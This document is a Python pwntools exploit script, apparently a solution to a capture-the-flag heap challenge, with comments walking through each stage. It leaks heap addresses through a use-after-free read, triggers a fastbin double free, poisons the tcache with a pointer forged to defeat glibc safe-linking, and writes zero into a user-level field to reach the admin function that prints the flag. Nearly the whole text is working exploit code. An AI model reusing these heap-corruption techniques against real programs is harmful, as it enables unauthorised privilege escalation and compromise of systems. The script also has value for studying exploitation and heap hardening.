from pwn import *

context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("app")

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
else:
	p = elf.process()

# gdb.attach(p, gdbscript="set max-visualize-chunk-size 0x100")
# pause()

rating_index = 0
def create_rating(data):
	global rating_index
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"> ", data)
	rating_index += 1
	return rating_index

def delete_rating(index):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"> ", str(index).encode())

def scream(data_list, send_quit = True):
	p.sendlineafter(b"> ", b"4")
	p.recvuntil(b"content!")
	for data in data_list:
		p.sendline(data)
	if send_quit:
		p.sendline(b"quit")

# read and parse the output of `showRatings` and return it as a list of strings
def show_ratings():
	p.sendlineafter(b"> ", b"3")
	res = []
	for i in range(1, rating_index + 1):
		p.recvuntil((str(i) + ": ").encode())
		res.append(p.readuntil(b"\n", drop = True))
	return res

# set initial username and password values to some junk data
p.sendlineafter(b"username: ", b"XXXX")
p.sendlineafter(b"password: ", b"YYYY")

# allocate two 0x20-sized chunks
rating_A = create_rating(b"S" * 16)
rating_B = create_rating(b"R" * 16)

# fill the 0x20 size tcache by allocating and then freeing
# 7 chunks of size 0x20. It appears that when the length of
# a C++ string is less that 15 or 16, it will try to store
# the string data inside the string object itself and not
# allocate another buffer on the heap. However, when the
# size gets larger, it has to allocate a seperate buffer on
# the heap and keep a pointer to that buffer in the string object.
# So, if we provide a buffer of 20 characters, it will call malloc(20)
# which will then allocate a chunk of size 0x20. Then these chunks
# get freed by our program and fill 0x20 tcache.
scream([b"A" * 20] * 7)

# now that the tcache is full, malloc will move the next freed chunks
# straight to the fastbins.
delete_rating(rating_A)
delete_rating(rating_B)

# use a read-after-free vulnerability to leak heap addresses.
# the program doesn't remove freed ratings from the map object in
# the User object. So, showRatings will print the fd pointers of the freed
# chunks. In this glibc version, there is pointer protection. the FD pointers of
# chunks that are linked into the fastbins and tcachebins are XORed with
# the address where we're writing those pointers into (chunk+16) shifted to right by 12.
# therefore, the last chunk in the fastbin that was supposed to have an FD of 0 will have
# an FD equal to the address of (chunk+16) right-shifted by 12. We can use this to leak the heap.
heap_leak = u64(show_ratings()[rating_A - 1].ljust(8, b"\0")) << 12
log.info("heap_leak = " + hex(heap_leak))

# trigger double-free! makes the fastbin circular.
delete_rating(rating_A)

# Clear the tcache
for i in range(7):
	create_rating(b"JUNK")

# Change the FD pointer of rating_A chunk in the fastbins.
# Before this chunk is returned by malloc, it will do a loop on
# the rest of the fastbin and add the chunks to tcache. Because fastbin
# is circular now, it will add rating_B and then rating_A to tcache.
# However, writing into the FD field  happens after the chunk is returned by
# malloc. So, we are actually writing into the FD pointer of a chunk that will be
# in the tcache. Because tcache chunks have pointers to the user data of the next chunk,
# we can just enter the target address directly and we don't have to subtract 16 from it.
# Also, we're XORing the address to simulate malloc PROTECT_PTR macro.
create_rating(p64((heap_leak + 0x320) ^ (heap_leak >> 12)))

create_rating(b"D" * 8) # allocating rating_B from tcache
create_rating(b"E" * 8)	# allocating rating_A from tcache

# this time the tcache head is at our target address (heap_leak + 0x320)
# and malloc will return the target address. There is apparently no check
# in tcache to match the chunk size of the returned chunk with the tcachebin
# containing this chunk (unlike in fastbins) so we don't need to worry about
# having fake size metadata in the qword before the returned address.
# Our target address can be any arbitrary aligned address.
create_rating(p64(0))	# writing 0 into target address (user.user_level_)

# trigger dpAdminStuff() to print the flag
p.sendlineafter(b"> ", b"5")

p.interactive()
